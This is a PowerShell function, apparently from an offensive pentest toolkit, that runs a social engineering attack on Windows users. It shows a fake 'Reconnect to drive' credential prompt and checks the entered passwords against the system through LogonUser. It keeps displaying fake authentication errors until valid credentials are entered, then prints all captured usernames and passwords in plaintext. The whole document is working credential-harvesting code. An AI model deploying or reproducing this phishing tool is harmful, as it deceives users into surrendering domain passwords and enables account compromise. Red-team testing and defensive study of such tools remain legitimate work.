#requires -Version 2
Function Invoke-MappedDriveSEAttack
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true,Position = 1)]
        [string]$Drive

    )
    <#
            # All credit to the original author(s): Ryan Watson (Watson0x90)
            #
            # Create-Unattend.ps1 is free software: you can redistribute it and/or modify
            # it under the terms of the GNU General Public License as published by
            # the Free Software Foundation, either version 3 of the License, or
            # (at your option) any later version.
            #
            # Create-Unattend.ps1 is distributed in the hope that it will be useful,
            # but WITHOUT ANY WARRANTY; without even the implied warranty of
            # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
            # GNU General Public License for more details.
            #
            # You should have received a copy of the GNU General Public License
            # along with Create-Unattend.ps1.  If not, see <http://www.gnu.org/licenses/>.

            .SYNOPSIS Social engineering attack prompting users re-enter credentials for 
            a mapped drive on their computer. This will perform a check till valid 
            workstation or domain creds are entered. Output will return both valid and unvalid credentials.
            This script has been tested on Windows 7, Windows 8.1, and Windows 10

            The following should be considered:
            1) The user is active
            2) There are mapped drives on the host

            Example Output:

            Domain    CredentialDomain   Username   Password  Valid
            ------    ----------------   --------   --------  -----
            MyDomain  MyDomain           user       P@ssword  False
            MyDomain  DifferentDomain    admin      P@ssword  True

            .Description Social engineering attack prompting users re-enter credentials for a mapped drive on their computer.

            .Example
            Invoke-MappedDriveSEAttack -Drive R
	
            Invoke-MappedDriveSEAttack -Drive T | Out-File C:\users\public\libraries\tmp.library-ms
    #>

    $ErrorActionPreference = 'SilentlyContinue'
   
    $errorNoDrive = 'No mapped drives on host. Exiting...'

    
    $Source = @"

    using System;
    
    public class LoginClass 
    {

       // http://msdn.microsoft.com/en-us/library/aa378184.aspx
       [System.Runtime.InteropServices.DllImport("advapi32.dll")]
       public static extern bool LogonUser(string userName, string domainName, string password, int LogonType, int LogonProvider,ref IntPtr phToken);
   }

"@
    
    Add-Type -TypeDefinition $Source -PassThru -Language CSharp

    function Error-BadCredentialsPrompt
    {
        $wshell = New-Object -ComObject Wscript.Shell
        $wshell.Popup('Bad Username or Password',0,'Failed Authentication',0x5+0x10)
    }

    function Test-Credentials
    {
        Param($username,$password,$domain)
        [IntPtr]$userToken = [Security.Principal.WindowsIdentity]::GetCurrent().Token
   
        $valid = [LoginClass]::LogonUser( $username,$domain,$password, 2, 0, [ref]$userToken)

        if($valid)
        {
            return $true
        }
        else
        {
            return $false
        }
    }

          
	$Drive = $Drive + ':\'		
    $ValidCreds = $false
    $credentials = @()
    Do
    {
        #$testCred = Steal-Credential -driveLetter $Drive
				
        $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
				
        $UserDefDomain = $cred.GetNetworkCredential().Domain
        $username = $cred.GetNetworkCredential().UserName
        $password = $cred.GetNetworkCredential().Password
        $CurrentDomain = $env:UserDomain
				
                
        $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
                
								
        if($isValid -eq $false)
        {
            $credentialsTemp = New-Object -TypeName psobject -Property @{
                Domain   = $CurrentDomain
                CredentialDomain = $UserDefDomain
                Username = $username
                Password = $password
                Valid    = $false
            }
            $credentials += $credentialsTemp
            $retry = Error-BadCredentialsPrompt
            if($retry -eq 2)
            {
                '!! User exited erorr prompt without retry !!'
                break
            }
        }
        else
        {
            $credentialsTemp = New-Object -TypeName psobject -Property @{
                Domain   = $CurrentDomain
                CredentialDomain = $UserDefDomain
                Username = $username
                Password = $password
                Valid    = $true
            }
            $credentials += $credentialsTemp
            $ValidCreds = $true
        }
    }
    While($ValidCreds -eq $false)
    '##Credentials##'
    $credentials |
    Select-Object -Property Domain, CredentialDomain, Username, Password, Valid |
    Format-Table -AutoSize
}
